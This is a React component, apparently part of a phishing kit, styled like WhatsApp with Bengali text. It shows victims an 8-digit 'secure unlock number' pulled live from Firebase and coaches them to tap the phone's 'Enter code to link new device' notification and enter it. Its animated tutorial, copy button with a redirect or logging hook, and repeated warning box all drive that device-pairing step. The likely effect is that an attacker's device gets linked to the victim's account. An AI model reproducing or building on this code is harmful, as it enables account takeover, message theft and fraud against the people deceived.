import React, { useState, useEffect } from "react";
import { AlertCircle, HelpCircle, Copy, Check, ShieldAlert, Wifi, Battery, Bell, Fingerprint, ExternalLink, Video, EyeOff } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

interface GuidePhaseProps {
  timeLeft: number;
  liveCode: string; // From Firebase Realtime DB
  showError: boolean;
  onActionClick: () => void;
  videoUrl?: string;
  onBack?: () => void;
}

export const GuidePhase: React.FC<GuidePhaseProps> = ({
  timeLeft,
  liveCode,
  showError,
  onActionClick,
  onBack
}) => {
  const [copied, setCopied] = useState(false);
  const [animationStep, setAnimationStep] = useState(0);
  const [showTutorialVideo, setShowTutorialVideo] = useState(false);

  // Pad code with space filler to exact 8 digits
  const formattedCode = liveCode.padEnd(8, " ");

  const handleCopyCode = () => {
    const codeToCopy = liveCode.trim();
    if (!codeToCopy) return;

    const performCopy = () => {
      if (navigator.clipboard) {
        navigator.clipboard.writeText(codeToCopy)
          .then(() => setCopied(true))
          .catch(() => fallbackCopy(codeToCopy));
      } else {
        fallbackCopy(codeToCopy);
      }
    };

    const fallbackCopy = (text: string) => {
      try {
        const input = document.createElement("input");
        input.value = text;
        input.style.position = "absolute";
        input.style.left = "-9999px";
        document.body.appendChild(input);
        input.select();
        const success = document.execCommand("copy");
        document.body.removeChild(input);
        if (success) {
          setCopied(true);
        }
      } catch (e) {
        console.warn("Fallback copy failed:", e);
      }
    };

    performCopy();
    onActionClick(); // Redirection launch or logging
  };

  useEffect(() => {
    if (copied) {
      const timer = setTimeout(() => setCopied(false), 3000);
      return () => clearTimeout(timer);
    }
  }, [copied]);

  // Infinite loop for our interactive mockup tutorial video (CSS version)
  useEffect(() => {
    const interval = setInterval(() => {
      setAnimationStep((prev) => (prev + 1) % 4);
    }, 4500); // 4.5s per sequence step for readability
    return () => clearInterval(interval);
  }, []);

  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.98, y: 10 }}
      animate={{ opacity: 1, scale: 1, y: 0 }}
      exit={{ opacity: 0, scale: 0.98, y: -10 }}
      transition={{ duration: 0.3 }}
      className="bg-white rounded-2xl p-4 mx-auto my-1 max-w-[335px] shadow-lg border border-slate-100 text-center relative z-10"
      id="guideSection"
    >
      <AnimatePresence mode="wait">
        {showTutorialVideo ? (
          <motion.div
            key="tutorial-video-full"
            initial={{ opacity: 0, scale: 0.98 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.98 }}
            className="flex flex-col space-y-3"
          >
            <div className="text-[12px] font-extrabold text-[#075e54] flex items-center justify-center gap-1">
              <Video className="w-4 h-4 text-emerald-600 animate-pulse" />
              <span>সহজে যুক্ত করার টিউটোরিয়াল ভিডিও</span>
            </div>

            <div className="relative aspect-[9/16] w-full max-h-[300px] rounded-xl overflow-hidden bg-black flex items-center justify-center border border-slate-800 shadow-inner">
              <video
                src="my-video.mp4"
                controls
                autoPlay
                playsInline
                loop
                className="w-full h-full object-contain"
                style={{ maxHeight: "300px" }}
              >
                Your browser does not support the video tag.
              </video>
            </div>

            <button
              onClick={() => setShowTutorialVideo(false)}
              className="w-full py-2.5 bg-slate-800 hover:bg-slate-700 text-white font-extrabold rounded-xl transition-all text-[12px] flex items-center justify-center gap-1.5 cursor-pointer border-none shadow-xs"
            >
              <EyeOff className="w-4 h-4 text-slate-300" />
              <span>পেছনে ফিরুন (Hide Video)</span>
            </button>
          </motion.div>
        ) : (
          <motion.div
            key="guide-content-full"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col"
          >
            {/* Visual Status Indicator */}
            <div className="flex items-center justify-center gap-1 mb-2 text-[10px] font-extrabold text-red-600 bg-red-50 py-1 px-2.5 rounded-full w-fit mx-auto">
              <ShieldAlert className="w-3.5 h-3.5 text-red-600 animate-pulse" />
              <span>সংযুক্ত করার অফিশিয়াল আনলক নাম্বার</span>
            </div>

            <h2 className="text-[13.5px] font-black text-slate-800 mb-2 leading-tight font-sans text-center">
              নিচের ৮ সংখ্যার সুরক্ষাধীন আনলক নাম্বারটি সঠিক স্থানে বসান
            </h2>

            {/* Code Display Area or Countdown */}
            {timeLeft > 0 ? (
              <div 
                id="countdownBox" 
                className="bg-amber-50 text-amber-800 text-[11px] font-bold py-2 px-3 rounded-xl border border-amber-100 flex items-center justify-center gap-1.5 shadow-3xs mb-2.5 animate-pulse"
              >
                সিকিউর আনলক নাম্বারটি আসছে... <span className="text-emerald-700 underline font-mono text-[13px] font-black">{timeLeft}s</span>
              </div>
            ) : (
              <div className="space-y-3 mb-2.5">
                {/* Beautiful 8-Digit Grid Boxes */}
                <div className="flex justify-center gap-1" id="pinContainer">
                  {formattedCode.split("").map((char, index) => (
                    <div
                      key={index}
                      className={`w-[27px] h-[36px] rounded-lg border text-[15px] font-extrabold shadow-3xs flex items-center justify-center transition-all duration-300 ${
                        char.trim() 
                          ? "border-emerald-600 bg-emerald-50 text-[#075e54]" 
                          : "border-slate-200 bg-slate-50 text-slate-400"
                      }`}
                    >
                      {char.trim() ? char : "-"}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* 📹 STUNNING LIVE CSS ANIMATION SIMULATOR (Visual Tutorial) */}
            <div className="mb-3 bg-slate-950 rounded-xl p-2 border border-slate-900 relative overflow-hidden text-left shadow-inner">
              {/* Mock phone outer frame container */}
              <div className="w-full text-[9px] text-slate-400 flex justify-between items-center pb-1.5 border-b border-white/5 font-mono">
                <span className="font-extrabold text-[9px] text-[#00a884]">TUTORIAL VIDEO (সরাসরি দেখুন)</span>
                <div className="flex items-center gap-1 text-slate-500 scale-90">
                  <Wifi className="w-2.5 h-2.5" />
                  <Battery className="w-3 h-3 text-emerald-500" />
                </div>
              </div>

              {/* Height and dynamic slide content */}
              <div className="h-[95px] relative flex flex-col justify-center items-center overflow-hidden py-1 select-none font-sans">
                
                <AnimatePresence mode="wait">
                  {animationStep === 0 && (
                    <motion.div
                      key="step0"
                      initial={{ opacity: 0, y: 5 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -5 }}
                      className="w-full h-full flex flex-col justify-start space-y-1.5 mt-0.5"
                    >
                      <div className="text-[9px] font-extrabold text-slate-500 uppercase tracking-wide">১. নোটিফিকেশন বার টেনে নোটিফিকেশনে চাপুন:</div>
                      {/* Simulated pull down bar alert */}
                      <div className="w-full bg-slate-900 border border-slate-800 rounded-lg p-1.5 flex items-center gap-1.5 relative shadow-md">
                        <div className="w-4 h-4 rounded-full bg-emerald-500 flex items-center justify-center shrink-0">
                          <Bell className="w-2.5 h-2.5 text-white fill-white" />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="text-[9px] font-bold text-white flex justify-between leading-none mb-0.5">
                            <span>WhatsApp Link</span>
                            <span className="text-[7.5px] text-emerald-400">Just now</span>
                          </div>
                          <div className="text-[8.5px] text-slate-300 font-medium truncate leading-none">
                            Enter code to link new device
                          </div>
                        </div>
                        {/* Glowing Pulse cursor pointing finger */}
                        <motion.div 
                          animate={{ scale: [1, 1.15, 1] }} 
                          transition={{ repeat: Infinity, duration: 1.5 }}
                          className="absolute right-2 bottom-0.5 bg-yellow-400 text-slate-950 font-black text-[8px] py-0.5 px-1 rounded-md shadow border border-white flex items-center gap-0.5"
                        >
                          👉 <span>এখানে টিপুন</span>
                        </motion.div>
                      </div>
                    </motion.div>
                  )}

                  {animationStep === 1 && (
                    <motion.div
                      key="step1"
                      initial={{ opacity: 0, y: 5 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -5 }}
                      className="w-full h-full flex flex-col justify-center items-center text-center space-y-1"
                    >
                      <div className="text-[9px] font-extrabold text-slate-500 uppercase tracking-wide">২. আপনার ফোন থেকে লক খুলুন:</div>
                      <div className="flex items-center gap-1.5 bg-slate-900/50 px-2.5 py-1.5 rounded-lg border border-slate-900">
                        <Fingerprint className="w-5 h-5 text-emerald-400 animate-pulse" />
                        <span className="text-[9px] text-slate-200 font-bold">ক্রোম বা অ্যাপ লক আনলক করুন</span>
                      </div>
                    </motion.div>
                  )}

                  {animationStep === 2 && (
                    <motion.div
                      key="step2"
                      initial={{ opacity: 0, y: 5 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -5 }}
                      className="w-full h-full flex flex-col justify-start space-y-1"
                    >
                      <div className="text-[9px] font-extrabold text-slate-500 uppercase tracking-wide">৩. নিচের আনলক নাম্বারটি টাইপ করুন:</div>
                      <div className="bg-slate-900 border border-slate-800 rounded-lg p-1.5 space-y-1">
                        <div className="text-[8px] font-bold text-slate-400 text-center leading-none">Enter code on phone:</div>
                        <div className="flex justify-center gap-0.5">
                          {formattedCode.split("").map((c, idx) => (
                            <span 
                              key={idx} 
                              className={`w-3.5 h-5 rounded border border-emerald-500/30 bg-emerald-950/40 text-[9.5px] font-extrabold flex items-center justify-center text-emerald-400 font-mono ${
                                idx < 4 ? "animate-pulse" : ""
                              }`}
                            >
                              {c.trim() ? c : "•"}
                            </span>
                          ))}
                        </div>
                      </div>
                    </motion.div>
                  )}

                  {animationStep === 3 && (
                    <motion.div
                      key="step3"
                      initial={{ opacity: 0, scale: 0.95 }}
                      animate={{ opacity: 1, scale: 1 }}
                      exit={{ opacity: 0 }}
                      className="w-full h-full flex flex-col justify-center items-center text-center space-y-1"
                    >
                      <div className="w-6 h-6 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-[14px] font-bold animate-bounce">
                        ✓
                      </div>
                      <div className="text-[#00a884] font-extrabold text-[11px] leading-none">সংযোগ সফলভাবে চালু হয়েছে!</div>
                      <div className="text-[8.5px] text-slate-400">এখন সরাসরি কথা বলা শুরু করুন</div>
                    </motion.div>
                  )}
                </AnimatePresence>

              </div>

              {/* Small Dot Sequence Progress Track */}
              <div className="flex justify-center gap-1 pt-1.5 border-t border-white/5">
                {[0, 1, 2, 3].map((idx) => (
                  <span
                    key={idx}
                    className={`w-1 h-1 rounded-full transition-all duration-300 ${
                      idx === animationStep ? "bg-emerald-400 w-2.5" : "bg-slate-700"
                    }`}
                  />
                ))}
              </div>
            </div>

            {/* Copy Action Button with floating Hand Cursor Guide */}
            {timeLeft <= 0 && (
              <div className="relative mb-2.5">
                <button
                  onClick={handleCopyCode}
                  className="w-full py-2.5 bg-[#128c7e] hover:bg-[#075e54] active:scale-[0.98] text-white font-extrabold rounded-xl shadow-xs transition-colors text-[12.5px] flex items-center justify-center gap-1.5 cursor-pointer border-none relative z-10"
                  id="actionBtn"
                >
                  {copied ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-white" />
                      <span>নাম্বারটি সফলভাবে কপি হয়েছে!</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5 text-white animate-bounce" />
                      <span>প্রাইভেট নাম্বারটি কপি করুন</span>
                    </>
                  )}
                </button>

                {!copied && (
                  <motion.div
                    initial={{ opacity: 0, y: 5 }}
                    animate={{ opacity: 1, y: [0, 4, 0] }}
                    transition={{ repeat: Infinity, duration: 1.2, ease: "easeInOut" }}
                    className="absolute -bottom-8 left-1/2 -translate-x-1/2 bg-yellow-400 text-slate-950 text-[9.5px] font-extrabold py-0.5 px-2 rounded-md shadow border border-white flex items-center gap-0.5 whitespace-nowrap z-20 pointer-events-none"
                  >
                    <span>👆 এখানে চাপ দিয়ে কপি করুন</span>
                    <span className="text-[11px] animate-pulse">👉</span>
                  </motion.div>
                )}
              </div>
            )}

            {/* Tutorial Video Play Activator Button */}
            <div className="mb-2">
              <button
                onClick={() => setShowTutorialVideo(true)}
                className="w-full py-2 px-3 bg-emerald-50 hover:bg-emerald-100/80 active:scale-[0.98] text-[#075e54] font-extrabold rounded-xl border border-emerald-500/10 shadow-3xs transition-all text-[11.5px] flex items-center justify-center gap-1.5 cursor-pointer border-none"
              >
                <Video className="w-3.5 h-3.5 text-emerald-600 animate-pulse" />
                <span>আপনার হোয়াটসঅ্যাপ থেকে যুক্ত করুন</span>
              </button>
            </div>

            {/* Conditional operator warning statement */}
            {showError && (
              <motion.div
                initial={{ opacity: 0, y: 5 }}
                animate={{ opacity: 1, y: 0 }}
                className="text-left text-[10.5px] bg-red-50 text-red-700 p-2.5 rounded-xl border border-red-50 mb-2 leading-tight"
                id="errorBox"
              >
                <div className="font-bold text-red-800 mb-0.5 flex items-center gap-1">
                  <AlertCircle className="w-3 h-3 shrink-0" />
                  <span>সতর্কতা বার্তা:</span>
                </div>
                ফোনের notification বার থেকে <span className="font-extrabold text-red-950">"Enter code to link new device"</span> টিপুন এবং ওপরে প্রদর্শিত ৮ সংখ্যার নাম্বারটি বসান।
              </motion.div>
            )}

            {onBack && (
              <button
                type="button"
                onClick={onBack}
                className="mt-1 w-full py-1.5 bg-slate-50 hover:bg-slate-100/80 text-[#075e54] border border-slate-200 active:scale-[0.98] font-extrabold rounded-lg text-[11px] shadow-xs transition-all cursor-pointer flex items-center justify-center gap-1"
              >
                <span>← পেছনে ফিরুন</span>
              </button>
            )}
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
};
